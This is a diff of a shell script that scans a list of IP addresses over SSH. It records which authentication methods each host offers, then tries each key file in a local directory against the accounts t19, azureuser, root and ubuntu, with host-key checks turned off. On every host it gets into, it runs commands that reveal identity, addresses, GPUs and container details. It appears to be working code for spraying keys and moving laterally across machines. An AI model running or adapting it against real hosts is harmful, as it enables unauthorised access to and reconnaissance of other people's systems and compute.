@@ -17,11 +17,12 @@ for ip in $ips; do
   out=$(timeout 12 ssh -n -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
         -o ConnectTimeout=8 -o PreferredAuthentications=none "t19@$ip" true 2>&1 | tr '\n' ';' | head -c 300)
   echo -e "SSH_METHODS\t$ip\t$out"
-  for k in kh/k*; do
-    [ -f "$k" ] || continue
+  mapfile -t KF < <(find kh -maxdepth 1 -type f -name "k*" | sort)
+  echo "KEYFILES=${#KF[@]}"
+  for k in "${KF[@]}"; do
     for u in t19 azureuser root ubuntu; do
       out=$(timeout 12 ssh -n -i "$k" -o BatchMode=yes -o StrictHostKeyChecking=no \
-            -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 -o PreferredAuthentications=publickey \
+            -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 -o PreferredAuthentications=publickey -o IdentitiesOnly=yes \
             "$u@$ip" 'id; hostname -I; nvidia-smi -L; cat /proc/1/cgroup' 2>&1 | tr '\n' ';' | head -c 400)
       case "$out" in
         *"Permission denied"*|*"Connection"*|*"closed"*|*"timed out"*|*"refused"*)
